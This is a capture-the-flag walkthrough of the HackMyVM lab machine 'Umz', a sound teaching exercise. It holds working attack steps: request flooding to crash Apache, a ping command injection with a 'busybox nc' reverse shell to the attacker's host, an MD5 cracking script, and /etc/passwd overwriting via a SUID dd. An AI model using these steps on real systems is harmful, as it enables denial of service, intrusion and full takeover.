# Umz

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Umz | LingMj | Beginner | HackMyVM |

**Summary:** Umz is a creative beginner-level Linux machine on HackMyVM that chains together an unconventional initial-access vector with two distinct privilege escalation steps. The attack begins by discovering a web application on port 80 titled "cyber fortress 9000" that intentionally taunts the attacker with DDoS bravado. Fuzzing the `/index.php` endpoint reveals a hidden `stress` GET parameter that exposes a Resource Stress Test Interface. Flooding this endpoint with requests causes the Apache service to crash, which in turn uncovers a hidden Flask debug application running on port 8080. That application hosts a "System Debug Console" login form; guessing weak credentials grants access to a "System Maintenance Panel" featuring a ping utility. The ping input is unsanitized and trivially injectable via a semicolon (`;`), yielding a remote code execution primitive and ultimately a reverse shell as the `welcome` user. From there, `sudo` rights to `/usr/bin/md5sum` allow reading an otherwise-unreadable password file at `/opt/flask-debug/umz.pass`. The MD5 hash is cracked via a custom Python script against `rockyou.txt`, revealing the password for a second user `umzyyds`. That user's home directory contains a suspicious SUID/SGID binary named `Dashazi` — which, upon inspection with `strings`, is revealed to be a renamed copy of `dd`. Leveraging `dd`'s ability to write arbitrary files, a crafted `/etc/passwd` entry is injected, creating a new root-privileged user and completing the privilege escalation chain to a full root shell.

---

## Reconnaissance

### Host Discovery

The attacker's network was scanned using a custom PowerShell script to identify live virtual machine targets on the `192.168.100.0/24` subnet.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.140 08:00:27:E5:35:87 VirtualBox
```

The target was identified at **192.168.100.140**, confirmed as a VirtualBox guest by its MAC OUI prefix (`08:00:27`).

### Port Scan — Initial

A full-port Nmap scan with service and script detection was run against the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/umz]
└─$ nmap -sC -sV -p- -T4 192.168.100.140
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 20:15 WIB
Nmap scan report for 192.168.100.140
Host is up (0.0032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: cyber fortress 9000
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds
```

Two ports were open: **SSH on port 22** (OpenSSH 8.4p1, Debian 11) and **HTTP on port 80** (Apache 2.4.62). The HTTP title `cyber fortress 9000` immediately hinted at the machine's theme.

---

## Initial Access

### Web Enumeration — Port 80

Browsing to `http://192.168.100.140/` revealed a flashy, taunting landing page themed around DDoS resilience — openly daring attackers to try flooding the service.

![](image.png)

The page included slogans such as *"your ddos means nothing"*, *"warning: we want your ddos attacks"*, and a live counter claiming *"∞ blocked"*. The HTML source code contained two telling comments:

```
<!-- do you feel lucky, punk? -->
<!-- we eat ddos for breakfast -->
```

These comments, combined with the page's aggressive anti-DDoS posturing, were strong thematic hints: the intended attack path *was* to flood the service.

### Parameter Fuzzing — `/index.php`

Navigating to `/index.php` (directly or via source enumeration) revealed an additional interface. To find hidden GET parameters, `ffuf` was used with the DirBuster medium wordlist, filtering out the default response size of `2714` bytes.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/umz]
└─$ ffuf -u http://192.168.100.140/index.php?FUZZ=test -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 2714

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.140/index.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2714

________________________________________________

stress                  [Status: 200, Size: 2707, Words: 909, Lines: 94, Duration: 371ms]
:: Progress: [220559/220559] :: Job [1/1] :: 258 req/sec :: Duration: [0:22:41] :: Errors: 91228 ::
```

The hidden GET parameter **`stress`** was discovered. Accessing `http://192.168.100.140/index.php?stress=test` revealed the **Resource Stress Test Interface** — a diagnostic page that boasted "DDoS Protection Active" and performed CPU-intensive operations such as prime number generation (1,229 primes up to 10,000). The health check identifier `HEALTHY_STRING` was displayed alongside the system status.

![](image-1.png)

### Crashing Port 80 (The Intended DDoS)

The machine's entire theme was a misdirection wrapped in a hint: the `stress` parameter actually *did* stress the server. By flooding `index.php?stress=<value>` with a large volume of concurrent requests, the Apache web service became overwhelmed and eventually stopped responding — exactly as the page's own "Security Notice" warned it would ("Request rate limiting", "Automated traffic analysis", etc., were all fake).

After sustained flooding, port 80 became completely unreachable:

![](image-2.png)

The browser returned `ERR_CONNECTION_REFUSED` — `192.168.100.140` refused to connect on port 80.

### Port Scan — Post-Crash

With port 80 down, a second Nmap scan was run to check for newly exposed services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/umz]
└─$ nmap -sC -sV -p- -T5 192.168.100.140
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-02 14:20 WIB
Nmap scan report for 192.168.100.140
Host is up (0.0046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2)
| http-title: Debug Console Login
|_Requested resource was http://192.168.100.140:8080/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.40 seconds
```

Port **8080** was now open, running **Werkzeug httpd 1.0.1 (Python 3.9.2)** — a Flask development server. The HTTP title was "Debug Console Login" and it immediately redirected to `/login`.

### Flask Debug Console — Credential Guessing

Browsing to `http://192.168.100.140:8080/login` revealed a clean "System Debug Console" login form.

![](image-3.png)

Given the beginner difficulty, common weak credential pairs were tested. The valid credentials were found to be:

- **Username:** `admin`
- **Password:** `ad[REDACTED]`

### Remote Code Execution via Ping Injection

Successful authentication redirected to `/admin`, which presented a **System Maintenance Panel** — a simple web form accepting an IP address and executing a `ping` command.

![](image-4.png)

Since the application appeared to pass user input directly to a shell command, a semicolon (`;`) was used to inject an additional command. Injecting `192.168.100.1 ; id` confirmed command injection:

![](image-5.png)

The output clearly showed:

```
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

The web application was running as user **`welcome`**, and unsanitized shell metacharacters allowed arbitrary OS command execution.

### Reverse Shell

A Netcat listener was set up on the attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/umz]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

The following payload was injected into the ping form to spawn a reverse shell:

```
192.168.100.1 ; busybox nc 192.168.100.1 4444 -e /bin/bash
```

![](image-6.png)

The application's output confirmed the command was executed (it timed out waiting for ping since the shell was handed off). The listener caught the connection:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 56531
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
welcome@Umz:/root$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/umz]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

welcome@Umz:/root$ export TERM=xterm-256color
welcome@Umz:/root$ export SHELL=/bin/bash
welcome@Umz:/root$ stty rows 38 cols 116
welcome@Umz:/root$ cd
welcome@Umz:~$ ls -la
total 24
drwxr-xr-x 2 welcome welcome 4096 May  3  2025 .
drwxr-xr-x 4 root    root    4096 May  3  2025 ..
lrwxrwxrwx 1 root    root       9 May  3  2025 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
-rw-r--r-- 1 root    root      44 May  3  2025 user.txt
```

A fully interactive TTY shell was established as user **`welcome`**. The `user.txt` flag was accessible in the home directory.

---

## Privilege Escalation

### Stage 1: `sudo md5sum` → Cracking `umz.pass`

Checking `sudo` privileges for the `welcome` user:

```bash
welcome@Umz:~$ which sudo
/usr/bin/sudo
welcome@Umz:~$ sudo -l
Matching Defaults entries for welcome on Umz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```

The `welcome` user could run `/usr/bin/md5sum` as root with no password. While `md5sum` cannot directly write files or execute code, it can **read any file** on the system — including files only readable by root — and output their MD5 hash. This is a known GTFOBins-style primitive for reading otherwise-inaccessible file *content* indirectly through hash comparison/cracking.

Exploring `/opt` revealed the Flask debug application and an interesting protected password file:

```bash
welcome@Umz:~$ ls -la /opt
total 12
drwxr-xr-x  3 root    root    4096 May  3  2025 .
drwxr-xr-x 18 root    root    4096 Mar 18  2025 ..
drwxr-xr-x  2 welcome welcome 4096 May  3  2025 flask-debug
welcome@Umz:~$ cd /opt/flask-debug/
welcome@Umz:/opt/flask-debug$ ls -la
total 20
drwxr-xr-x 2 welcome welcome 4096 May  3  2025 .
drwxr-xr-x 3 root    root    4096 May  3  2025 ..
-rw-r--r-- 1 root    root    5001 May  3  2025 flask_debug.py
-rwx------ 1 root    root      10 May  3  2025 umz.pass
```

The file `umz.pass` had permissions `rwx------` (root only). Using `sudo md5sum` to compute its hash:

```bash
welcome@Umz:/opt/flask-debug$ sudo /usr/bin/md5sum /opt/flask-debug/umz.pass
a963fadd7fd379f9bc294ad0ba44f659  /opt/flask-debug/umz.pass
```

The MD5 hash `a963fadd7fd379f9bc294ad0ba44f659` was obtained. A custom Python script was written to crack it against `rockyou.txt`, accounting for possible trailing newline characters (a common gotcha when hashing file contents):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/umz]
└─$ cat crack.py
import hashlib

target_hash = "a963fadd7fd379f9bc294ad0ba44f659"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

def crack():
    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            for line in f:
                word = line.strip()

                variations = [word, word + "\n"]

                for v in variations:
                    guess = hashlib.md5(v.encode()).hexdigest()
                    if guess == target_hash:
                        print(f"[+] FOUND IT: {repr(v)}")
                        return
    except FileNotFoundError:
        print("Wordlist not found!")

crack()
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/umz]
└─$ python3 crack.py
[+] FOUND IT: 'sun[REDACTED]\n'
```

The password was cracked. Notably, the hash matched the password **with a trailing newline** (`\n`), meaning the file was written with a newline character — a subtle but important detail the script correctly handled.

### Stage 2: Lateral Movement → User `umzyyds`

Checking for other local users:

```bash
welcome@Umz:/opt/flask-debug$ ls -la /home
total 16
drwxr-xr-x  4 root    root    4096 May  3  2025 .
drwxr-xr-x 18 root    root    4096 Mar 18  2025 ..
drwx------  2 umzyyds umzyyds 4096 May  3  2025 umzyyds
drwxr-xr-x  2 welcome welcome 4096 May  3  2025 welcome
```

A second user, **`umzyyds`**, existed on the system. The cracked password was used to authenticate:

```bash
umzyyds@Umz:~$ id
uid=1001(umzyyds) gid=1001(umzyyds) groups=1001(umzyyds)
umzyyds@Umz:~$ ls -la
total 96
drwx------ 2 umzyyds umzyyds  4096 May  3  2025 .
drwxr-xr-x 4 root    root     4096 May  3  2025 ..
lrwxrwxrwx 1 root    root        9 May  3  2025 .bash_history -> /dev/null
-rw-r--r-- 1 umzyyds umzyyds   220 May  3  2025 .bash_logout
-rw-r--r-- 1 umzyyds umzyyds  3526 May  3  2025 .bashrc
-rwsr-sr-x 1 root    root    76712 May  3  2025 Dashazi
-rw-r--r-- 1 umzyyds umzyyds   807 May  3  2025 .profile
```

In `umzyyds`'s home directory sat a binary named **`Dashazi`** with both the **SUID** and **SGID** bits set (`-rwsr-sr-x`), owned by root. A 76 KB ELF binary with root SUID is immediately suspicious.

### Stage 3: `Dashazi` (SUID `dd` disguise) → Root

The binary was examined:

```bash
umzyyds@Umz:~$ file Dashazi
Dashazi: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=21bfd63cfb732f9c09d17921f8eef619429bcd35, stripped
```

Running `strings` on the binary revealed it was a renamed copy of the standard Unix `dd` utility. This was confirmed by attempting to read `/etc/shadow` using `dd`'s `if=` (input file) syntax:

```bash
umzyyds@Umz:~$ ./Dashazi if=/etc/shadow
root:$6$ncNrfMmFicrVYnMJ$eRxtK.IK.8vvnkzP8PMhc6HOpXWlSFs4vMyj5yz2qmIgQMAi6Zjv0vTF7YFo07hw1U.QAEGHAZRqeWOA15qcY1:20211:0:99999:7:::
daemon:*:20166:0:99999:7:::
bin:*:20166:0:99999:7:::
sys:*:20166:0:99999:7:::
sync:*:20166:0:99999:7:::
games:*:20166:0:99999:7:::
man:*:20166:0:99999:7:::
lp:*:20166:0:99999:7:::
mail:*:20166:0:99999:7:::
news:*:20166:0:99999:7:::
uucp:*:20166:0:99999:7:::
proxy:*:20166:0:99999:7:::
www-data:*:20166:0:99999:7:::
backup:*:20166:0:99999:7:::
list:*:20166:0:99999:7:::
irc:*:20166:0:99999:7:::
gnats:*:20166:0:99999:7:::
nobody:*:20166:0:99999:7:::
_apt:*:20166:0:99999:7:::
systemd-timesync:*:20166:0:99999:7:::
systemd-network:*:20166:0:99999:7:::
systemd-resolve:*:20166:0:99999:7:::
systemd-coredump:!!:20166::::::
messagebus:*:20166:0:99999:7:::
sshd:*:20166:0:99999:7:::
welcome:$6$Tcl1PdHt0sKyxCmX$0BRc1xwfh2ZcKWqdX.d9QZpZfoUojWKv76BIILLM6ZbQZ9w9e8hg23fl1yFQ5heujThjKtejlddXoTmj1R2230:20190:0:99999:7:::
umzyyds:$6$x2gN9IcmR0hd7u0Z$82Q/zIYKqF1ciAq1KLQYqi0VGU7Uoc/Mv0yJ6RiICKIpXYIWv3cUHjlRLxJFnSw2ArEDQsH26cZUF5b9tmUY//:20211:0:99999:7:::
2+1 records in
2+1 records out
1076 bytes (1.1 kB, 1.1 KiB) copied, 0.00105794 s, 1.0 MB/s
```

`/etc/shadow` was fully readable as root. Rather than spending time cracking the root hash, the more elegant approach was to **use `dd`'s write capability** (`of=` output file) to overwrite `/etc/passwd` and inject a new root-privileged user.

A new password hash was generated using `openssl`:

```bash
umzyyds@Umz:~$ openssl passwd -1 -salt pwn pwned000
$1$pwn$zIKEnjJRbh9RCYncONOLu1
```

The current `/etc/passwd` was copied to a staging file, and a new root-equivalent entry was appended:

```bash
umzyyds@Umz:~$ cat /etc/passwd > passwd.fake
umzyyds@Umz:~$ echo 'ouba:$1$pwn$zIKEnjJRbh9RCYncONOLu1:0:0:root:/root:/bin/bash' >> passwd.fake
```

The forged `passwd.fake` was then written over `/etc/passwd` using the SUID `Dashazi` (`dd`):

```bash
umzyyds@Umz:~$ ./Dashazi if=passwd.fake of=/etc/passwd
2+1 records in
2+1 records out
1502 bytes (1.5 kB, 1.5 KiB) copied, 0.0018498 s, 812 kB/s
```

Finally, switching to the newly created user `ouba` with password `pwned000`:

```bash
umzyyds@Umz:~$ su - ouba
Password:
root@Umz:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Umz:~# whoami
root
root@Umz:~# hostname
Umz
root@Umz:~# cat /home/welcome/user.txt /root/root.txt
flag{user-448[REDACTED]}
flag{root-a73[REDACTED]}
```

Full root access was achieved. Both flags were captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Full-port Nmap scan revealed ports 22 (SSH) and 80 (Apache 2.4.62 — "cyber fortress 9000"). HTML source contained DDoS-themed taunting comments hinting at the attack path.

2. **Vulnerability Discovery**: `ffuf` parameter fuzzing against `/index.php` identified a hidden `stress` GET parameter exposing a "Resource Stress Test Interface" — a CPU-intensive endpoint intentionally designed to be crashable under load.

3. **Exploitation (Initial Access)**: Flooding `index.php?stress=` with concurrent requests caused Apache on port 80 to crash. A re-scan revealed a Flask debug server on port 8080 (`Werkzeug 1.0.1 / Python 3.9.2`) running a "System Debug Console". Weak credentials (`admin` / `ad[REDACTED]`) granted access to a "System Maintenance Panel" ping utility. Semicolon injection (`;`) into the IP field confirmed unsanitized OS command execution (`uid=1000(welcome)`). A `busybox nc` reverse shell payload was injected to obtain an interactive shell as user `welcome`.

4. **Internal Enumeration**: `sudo -l` revealed `welcome` could run `/usr/bin/md5sum` as root without a password. The file `/opt/flask-debug/umz.pass` (root-only permissions) was hashed with `sudo md5sum`, yielding MD5 `a963fadd7fd379f9bc294ad0ba44f659`. A custom Python script cracked the hash against `rockyou.txt` (with newline variation), recovering the plaintext password for user `umzyyds`.

5. **Privilege Escalation**: Logging in as `umzyyds` revealed a SUID/SGID binary `Dashazi` in the home directory — confirmed via `strings` and live testing to be a renamed `dd`. The SUID `dd` was used to read `/etc/shadow` (confirming root-level read access), then to overwrite `/etc/passwd` with a crafted entry adding a new user (`ouba`) with UID/GID 0. `su - ouba` with the known password delivered a full root shell, and both `user.txt` and `root.txt` flags were captured.
